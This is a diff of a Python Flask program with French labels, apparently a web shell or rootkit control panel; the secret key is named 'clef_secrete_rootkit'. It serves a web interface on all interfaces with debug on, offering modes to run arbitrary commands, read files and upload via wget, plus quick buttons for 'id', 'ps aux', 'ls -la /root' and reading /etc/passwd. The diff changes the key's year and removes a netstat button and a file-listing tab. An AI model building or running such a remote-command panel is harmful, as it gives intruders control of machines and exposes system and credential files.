@@ -17,7 +17,7 @@ notifications = []
 notifications_lock = threading.Lock()
 
 app = Flask(__name__)
-app.secret_key = 'clef_secrete_rootkit_2024'
+app.secret_key = 'clef_secrete_rootkit_2025'
 UPLOAD_FOLDER = '/tmp/flask_uploads'
 
 if not os.path.exists(UPLOAD_FOLDER):
@@ -488,7 +488,6 @@ def main_interface():
                 <div class="tab active" onclick="changerMode('commande')">Mode Commande</div>
                 <div class="tab" onclick="changerMode('fichier')">Mode Fichier</div>
                 <div class="tab" onclick="changerMode('upload')">Mode Upload</div>
-                <div class="tab" onclick="testFichiers()">Liste fichiers</div>
             </div>
             
             <div class="status-info">
@@ -542,11 +541,9 @@ def main_interface():
                 <button onclick="document.getElementById('commande').value='uname -a'; executerCommande()">uname -a</button>
                 <button onclick="document.getElementById('commande').value='id'; executerCommande()">id</button>
                 <button onclick="document.getElementById('commande').value='ps aux'; executerCommande()">ps aux</button>
-                <button onclick="document.getElementById('commande').value='netstat -tuln'; executerCommande()">netstat -tuln</button>
                 <button onclick="document.getElementById('commande').value='ls -la /root'; executerCommande()">ls -la /root</button>
                 <button onclick="document.getElementById('commande').value='w'; executerCommande()">users</button>
                 <button onclick="document.getElementById('chemin').value='/etc/passwd'; changerMode('fichier'); lireFichier()">passwd</button>
-                <button onclick="testFichiers()">FICHIERS</button>
             </div>
         </div>
         
@@ -1265,4 +1262,5 @@ if __name__ == '__main__':
     print("Interface web: http://0.0.0.0:5000")
     print("Upload via wget disponible")
     app.run(host='0.0.0.0', port=5000, debug=True)
+
 
